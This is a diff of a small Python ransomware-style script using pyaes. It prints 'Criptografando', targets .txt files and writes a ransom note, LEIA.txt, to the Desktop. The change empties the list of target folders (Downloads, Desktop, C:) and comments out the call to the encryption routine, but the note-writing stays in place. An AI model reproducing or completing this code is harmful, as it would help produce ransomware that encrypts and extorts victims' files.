@@ -12,12 +12,9 @@ import pyaes
 from pathlib import Path
 #a=argv[1]
 lst_arq = ["*.txt"]
-lst_past = ["Downloads","Desktop","C:"]
-
-
+lst_past = []
 print('Criptografando')
 time.sleep(3)
-
 def txt():
     msg=open(f'{y}\\LEIA.txt','w+')
     msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
@@ -52,7 +49,7 @@ for i in lst_past:
     except Exception:
         pass
     os.chdir(desktop)
-    criptografando()
+    #criptografando()
 y = Path.home() / "Desktop"
 os.chdir(y)
 txt()
